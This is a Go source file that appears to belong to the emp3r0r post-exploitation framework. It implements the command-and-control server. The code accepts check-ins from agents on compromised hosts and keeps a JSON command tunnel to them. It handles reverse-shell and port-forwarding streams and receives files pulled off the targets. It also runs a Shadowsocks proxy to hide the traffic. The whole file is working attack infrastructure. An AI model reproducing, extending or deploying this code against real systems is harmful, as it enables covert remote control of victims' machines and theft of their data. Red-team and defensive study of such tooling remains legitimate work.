package cc

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/mux"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/ss"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/posener/h2conn"
	"github.com/schollz/progressbar/v3"
)

// Start Shadowsocks proxy server with a random password (RuntimeConfig.ShadowsocksPassword),
// listening on RuntimeConfig.ShadowsocksPort
// You can use the offical Shadowsocks program to start
// the same Shadowsocks server on any host that you find convenient
func ShadowsocksServer() {
	ctx, cancel := context.WithCancel(context.Background())
	var ss_config = &ss.SSConfig{
		ServerAddr:     "0.0.0.0:" + RuntimeConfig.ShadowsocksPort,
		LocalSocksAddr: "",
		Cipher:         ss.AEADCipher,
		Password:       RuntimeConfig.ShadowsocksPassword,
		IsServer:       true,
		Verbose:        false,
		Ctx:            ctx,
		Cancel:         cancel,
	}
	err := ss.SSMain(ss_config)
	if err != nil {
		CliFatalError("ShadowsocksServer: %v", err)
	}
	go KCPListenAndServe()
}

// TLSServer start HTTPS server
func TLSServer() {
	if _, err := os.Stat(Temp + tun.WWW); os.IsNotExist(err) {
		err = os.MkdirAll(Temp+tun.WWW, 0700)
		if err != nil {
			CliFatalError("TLSServer: %v", err)
		}
	}
	r := mux.NewRouter()

	// Load CA
	tun.CACrt = []byte(RuntimeConfig.CA)

	// handlers
	r.HandleFunc(fmt.Sprintf("/%s/{api}/{token}", tun.WebRoot), dispatcher)

	// use router
	http.Handle("/", r)

	// emp3r0r.crt and emp3r0r.key is generated by build.sh
	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", RuntimeConfig.CCPort), EmpWorkSpace+"/emp3r0r-cert.pem", EmpWorkSpace+"/emp3r0r-key.pem", nil)
	if err != nil {
		CliFatalError("Failed to start HTTPS server at *:%s", RuntimeConfig.CCPort)
	}
}

func dispatcher(wrt http.ResponseWriter, req *http.Request) {
	vars := mux.Vars(req)

	var rshellConn, proxyConn emp3r0r_data.H2Conn
	RShellStream.H2x = &rshellConn
	ProxyStream.H2x = &proxyConn

	token := vars["token"]
	// POST vars
	var path string
	path = req.URL.Query().Get("file_to_download")

	api := tun.WebRoot + "/" + vars["api"]
	switch api {
	// Message-based communication
	case tun.CheckInAPI:
		checkinHandler(wrt, req)
	case tun.MsgAPI:
		msgTunHandler(wrt, req)

	// stream based
	case tun.FTPAPI:
		// find handler with token
		for _, sh := range FTPStreams {
			if token == sh.Token {
				sh.ftpHandler(wrt, req)
				return
			}
		}
		wrt.WriteHeader(http.StatusBadRequest)

	case tun.FileAPI:
		if !IsAgentExistByTag(token) {
			wrt.WriteHeader(http.StatusBadRequest)
			return
		}
		path = util.FileBaseName(path) // only base names are allowed
		CliPrintDebug("FileAPI got a request for file: %s, request URL is %s",
			path, req.URL)
		local_path := Temp + tun.WWW + "/" + path
		if !util.IsFileExist(local_path) {
			wrt.WriteHeader(http.StatusNotFound)
			return
		}
		http.ServeFile(wrt, req, local_path)

	case tun.ProxyAPI:
		ProxyStream.portFwdHandler(wrt, req)
	default:
		wrt.WriteHeader(http.StatusBadRequest)
	}
}

// StreamHandler allow the http handler to use H2Conn
type StreamHandler struct {
	H2x     *emp3r0r_data.H2Conn // h2conn with context
	Buf     chan []byte          // buffer for receiving data
	Token   string               // token string, for agent auth
	BufSize int                  // buffer size for reverse shell should be 1
}

var (
	// RShellStream reverse shell handler
	RShellStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.RShellBufSize, Buf: make(chan []byte)}

	// ProxyStream proxy handler
	ProxyStream = &StreamHandler{H2x: nil, BufSize: emp3r0r_data.ProxyBufSize, Buf: make(chan []byte)}

	// FTPStreams file transfer handlers
	FTPStreams = make(map[string]*StreamHandler)

	// FTPMutex lock
	FTPMutex = &sync.Mutex{}

	// RShellStreams rshell handlers
	RShellStreams = make(map[string]*StreamHandler)

	// RShellMutex lock
	RShellMutex = &sync.Mutex{}

	// PortFwds port mappings/forwardings: { sessionID:StreamHandler }
	PortFwds = make(map[string]*PortFwdSession)

	// PortFwdsMutex lock
	PortFwdsMutex = &sync.Mutex{}
)

// ftpHandler handles buffered data
func (sh *StreamHandler) ftpHandler(wrt http.ResponseWriter, req *http.Request) {
	// check if an agent is already connected
	if sh.H2x.Ctx != nil ||
		sh.H2x.Cancel != nil ||
		sh.H2x.Conn != nil {
		CliPrintError("ftpHandler: occupied")
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	var err error
	sh.H2x = &emp3r0r_data.H2Conn{}
	// use h2conn
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("ftpHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// agent auth
	sh.H2x.Ctx, sh.H2x.Cancel = context.WithCancel(req.Context())
	// token from URL
	vars := mux.Vars(req)
	token := vars["token"]
	if token != sh.Token {
		CliPrintError("Invalid ftp token '%s vs %s'", token, sh.Token)
		return
	}
	CliPrintInfo("Got a ftp connection (%s) from %s", sh.Token, req.RemoteAddr)

	// save the file
	filename := ""
	for fname, persh := range FTPStreams {
		if sh.Token == persh.Token {
			filename = fname
			break
		}
	}
	// abort if we dont have the filename
	if filename == "" {
		CliPrintError("%s failed to parse filename", sh.Token)
		return
	}
	filename = util.FileBaseName(filename) // we dont want the full path
	filewrite := FileGetDir + filename + ".downloading"
	lock := FileGetDir + filename + ".lock"
	// is the file already being downloaded?
	if util.IsFileExist(lock) {
		CliPrintError("%s is already being downloaded", filename)
		http.Error(wrt, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
		return
	}

	// create lock file
	_, err = os.Create(lock)

	// FileGetDir
	if !util.IsFileExist(FileGetDir) {
		err = os.MkdirAll(FileGetDir, 0700)
		if err != nil {
			CliPrintError("mkdir -p %s: %v", FileGetDir, err)
			return
		}
	}

	// file
	targetFile := FileGetDir + util.FileBaseName(filename)
	targetSize := util.FileSize(targetFile)
	nowSize := util.FileSize(filewrite)

	// open file for writing
	f, err := os.OpenFile(filewrite, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		CliPrintError("ftpHandler write file: %v", err)
	}
	defer f.Close()

	// progressbar
	targetSize = util.FileSize(targetFile)
	nowSize = util.FileSize(filewrite)
	bar := progressbar.DefaultBytesSilent(targetSize)
	bar.Add64(nowSize) // downloads are resumable
	defer bar.Close()

	// log progress instead of showing the actual progressbar
	go func() {
		for state := bar.State(); state.CurrentPercent < 1; time.Sleep(time.Second) {
			state = bar.State()
			CliPrintInfo("%.2f%% downloaded at %.2fKB/s, %.2fs passed, %.2fs left",
				state.CurrentPercent*100, state.KBsPerSecond, state.SecondsSince, state.SecondsLeft)
		}
	}()

	// on exit
	defer func() {
		// cleanup
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("ftpHandler failed to close connection: " + err.Error())
			}
		}
		sh.Token = ""
		sh.H2x.Cancel()
		FTPMutex.Lock()
		delete(FTPStreams, filename)
		FTPMutex.Unlock()
		CliPrintWarning("Closed ftp connection from %s", req.RemoteAddr)

		// delete the lock file, unlock download session
		err = os.Remove(lock)
		if err != nil {
			CliPrintWarning("Remove %s: %v", lock, err)
		}

		// have we finished downloading?
		nowSize = util.FileSize(filewrite)
		targetSize = util.FileSize(targetFile)
		if nowSize == targetSize && nowSize >= 0 {
			err = os.Rename(filewrite, targetFile)
			if err != nil {
				CliPrintError("Failed to save downloaded file %s: %v", targetFile, err)
			}
			checksum := tun.SHA256SumFile(targetFile)
			CliPrintSuccess("Downloaded %d bytes to %s (%s)", nowSize, targetFile, checksum)
			return
		}
		if nowSize > targetSize {
			CliPrintError("Downloaded (%d of %d bytes), WTF?", nowSize, targetSize)
			return
		}
		CliPrintWarning("Incomplete download (%d of %d bytes), will continue if you run GET again", nowSize, targetSize)
	}()

	// read filedata
	for sh.H2x.Ctx.Err() == nil {
		data := make([]byte, sh.BufSize)
		n, err := sh.H2x.Conn.Read(data)
		if err != nil {
			CliPrintWarning("Disconnected: ftpHandler read: %v", err)
			return
		}
		if n < sh.BufSize {
			data = data[:n]
		}

		// write the file
		_, err = f.Write(data)
		if err != nil {
			CliPrintError("ftpHandler failed to save file: %v", err)
			return
		}

		// progress
		bar.Add(sh.BufSize)
	}
}

// portFwdHandler handles proxy/port forwarding
func (sh *StreamHandler) portFwdHandler(wrt http.ResponseWriter, req *http.Request) {
	var (
		err error
		h2x emp3r0r_data.H2Conn
	)
	sh.H2x = &h2x
	sh.H2x.Conn, err = h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("portFwdHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	ctx, cancel := context.WithCancel(req.Context())
	sh.H2x.Ctx = ctx
	sh.H2x.Cancel = cancel

	// save sh
	shCopy := *sh

	// record this connection to port forwarding map
	if sh.H2x.Conn == nil {
		CliPrintWarning("%s h2 disconnected", sh.Token)
		return
	}

	vars := mux.Vars(req)
	token := vars["token"]
	origToken := token    // in case we need the orignal session-id, for sub-sessions
	isSubSession := false // sub-session is part of a port-mapping, every client connection starts a sub-session (h2conn)
	if strings.Contains(string(token), "_") {
		isSubSession = true
		idstr := strings.Split(string(token), "_")[0]
		token = idstr
	}

	sessionID, err := uuid.Parse(token)
	if err != nil {
		CliPrintError("portFwd connection: failed to parse UUID: %s from %s\n%v", token, req.RemoteAddr, err)
		return
	}
	// check if session ID exists in the map,
	pf, exist := PortFwds[sessionID.String()]
	if !exist {
		CliPrintError("Unknown ID: %s", sessionID.String())
		return
	}
	pf.Sh = make(map[string]*StreamHandler)
	if !isSubSession {
		pf.Sh[sessionID.String()] = &shCopy // cache this connection
		// handshake success
		CliPrintDebug("Got a portFwd connection (%s) from %s", sessionID.String(), req.RemoteAddr)
	} else {
		pf.Sh[string(origToken)] = &shCopy // cache this connection
		// handshake success
		if strings.HasSuffix(string(origToken), "-reverse") {
			CliPrintDebug("Got a portFwd (reverse) connection (%s) from %s", string(origToken), req.RemoteAddr)
			err = pf.RunReversedPortFwd(&shCopy) // handle this reverse port mapping request
			if err != nil {
				CliPrintError("RunReversedPortFwd: %v", err)
			}
		} else {
			CliPrintDebug("Got a portFwd sub-connection (%s) from %s", string(origToken), req.RemoteAddr)
		}
	}

	defer func() {
		if sh.H2x.Conn != nil {
			err = sh.H2x.Conn.Close()
			if err != nil {
				CliPrintError("portFwdHandler failed to close connection: " + err.Error())
			}
		}

		// if this connection is just a sub-connection
		// keep the port-mapping, only close h2conn
		if string(origToken) != sessionID.String() {
			cancel()
			CliPrintDebug("portFwdHandler: closed connection %s", origToken)
			return
		}

		// cancel PortFwd context
		pf, exist = PortFwds[sessionID.String()]
		if exist {
			pf.Cancel()
		} else {
			CliPrintWarning("portFwdHandler: cannot find port mapping: %s", sessionID.String())
		}
		// cancel HTTP request context
		cancel()
		CliPrintWarning("portFwdHandler: closed portFwd connection from %s", req.RemoteAddr)
	}()

	for ctx.Err() == nil && pf.Ctx.Err() == nil {
		_, exist = PortFwds[sessionID.String()]
		if !exist {
			CliPrintWarning("Disconnected: portFwdHandler: port mapping not found")
			return
		}

		time.Sleep(200 * time.Millisecond)
	}
}

// receive checkin requests from agents, add them to `Targets`
func checkinHandler(wrt http.ResponseWriter, req *http.Request) {
	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	defer func() {
		err = conn.Close()
		if err != nil {
			CliPrintWarning("checkinHandler close connection: %v", err)
		}
		CliPrintDebug("checkinHandler finished")
	}()
	if err != nil {
		CliPrintError("checkinHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}
	var (
		target emp3r0r_data.AgentSystemInfo
		in     = json.NewDecoder(conn)
	)

	err = in.Decode(&target)
	if err != nil {
		CliPrintWarning("checkinHandler decode: %v", err)
		return
	}

	// set target IP
	target.From = req.RemoteAddr

	if !IsAgentExist(&target) {
		inx := assignTargetIndex()
		Targets[&target] = &Control{Index: inx, Conn: nil}
		shortname := strings.Split(target.Tag, "-agent")[0]
		// set labels
		if util.IsFileExist(AgentsJSON) {
			var mutex = &sync.Mutex{}
			if l := SetAgentLabel(&target, mutex); l != "" {
				shortname = l
			}
		}
		CliMsg("Checked in: %s from %s, "+
			"running %s\n",
			strconv.Quote(shortname), fmt.Sprintf("'%s - %s'", target.From, target.Transport),
			strconv.Quote(target.OS))

		ListTargets() // refresh agent list
	} else {
		// just update this agent's sysinfo
		for a := range Targets {
			if a.Tag == target.Tag {
				a = &target
				break
			}
		}
		shortname := strings.Split(target.Tag, "-agent")[0]
		// set labels
		if util.IsFileExist(AgentsJSON) {
			var mutex = &sync.Mutex{}
			if l := SetAgentLabel(&target, mutex); l != "" {
				shortname = l
			}
		}
		CliPrintDebug("Refreshing sysinfo\n%s from %s, "+
			"running %s\n",
			shortname, fmt.Sprintf("%s - %s", target.From, target.Transport),
			strconv.Quote(target.OS))
	}
}

// msgTunHandler JSON message based (C&C) tunnel between agent and cc
func msgTunHandler(wrt http.ResponseWriter, req *http.Request) {
	// updated on each successful handshake
	var last_handshake = time.Now()

	// use h2conn
	conn, err := h2conn.Accept(wrt, req)
	if err != nil {
		CliPrintError("msgTunHandler: failed creating connection from %s: %s", req.RemoteAddr, err)
		http.Error(wrt, http.StatusText(http.StatusInternalServerError), http.StatusInternalServerError)
		return
	}

	ctx, cancel := context.WithCancel(context.Background())

	defer func() {
		CliPrintDebug("msgTunHandler exiting")
		for t, c := range Targets {
			if c.Conn == conn {
				delete(Targets, t)
				SetDynamicPrompt()
				CliAlert(color.FgHiRed, "[%d] Agent dies", c.Index)
				CliMsg("[%d] agent %s disconnected\n", c.Index, strconv.Quote(t.Tag))
				ListTargets()
				AgentInfoPane.Printf(true, color.HiYellowString("No agent selected"))
				break
			}
		}
		if conn != nil {
			conn.Close()
		}
		cancel()
		CliPrintDebug("msgTunHandler exited")
	}()

	// talk in json
	var (
		in  = json.NewDecoder(conn)
		out = json.NewEncoder(conn)
		msg emp3r0r_data.MsgTunData
	)

	// Loop forever until the client hangs the connection, in which there will be an error
	// in the decode or encode stages.
	go func() {
		defer cancel()
		for ctx.Err() == nil {
			// deal with json data from agent
			err = in.Decode(&msg)
			if err != nil {
				return
			}
			// read hello from agent, set its Conn if needed, and hello back
			// close connection if agent is not responsive
			if strings.HasPrefix(msg.Payload, "hello") {
				reply_msg := msg
				reply_msg.Payload = msg.Payload + util.RandStr(util.RandInt(1, 10))
				err = out.Encode(reply_msg)
				if err != nil {
					CliPrintWarning("msgTunHandler cannot answer hello to agent %s", msg.Tag)
					return
				}
				last_handshake = time.Now()
			}

			// process json tundata from agent
			processAgentData(&msg)

			// assign this Conn to a known agent
			agent := GetTargetFromTag(msg.Tag)
			if agent == nil {
				CliPrintError("%v: no agent found by this msg", msg)
				return
			}
			shortname := agent.Name
			if agent == nil {
				CliPrintWarning("msgTunHandler: agent not recognized")
				return
			}
			if Targets[agent].Conn == nil {
				CliAlert(color.FgHiGreen, "[%d] Knock.. Knock...", Targets[agent].Index)
				CliAlert(color.FgHiGreen, "agent %s connected", strconv.Quote(shortname))
			}
			Targets[agent].Conn = conn
			Targets[agent].Ctx = ctx
			Targets[agent].Cancel = cancel
		}
	}()

	// wait no more than 2 min,
	// if agent is unresponsive, kill connection and declare agent death
	for ctx.Err() == nil {
		since_last_handshake := time.Since(last_handshake)
		agent_by_conn := GetTargetFromH2Conn(conn)
		name := emp3r0r_data.Unknown
		if agent_by_conn != nil {
			name = agent_by_conn.Name
		}
		CliPrintDebug("Last handshake from agent '%s': %v ago", name, since_last_handshake)
		if since_last_handshake > 2*time.Minute {
			CliPrintDebug("msgTunHandler: timeout, "+
				"hanging up agent (%v)'s C&C connection",
				name)
			return
		}
		util.TakeABlink()
	}
}
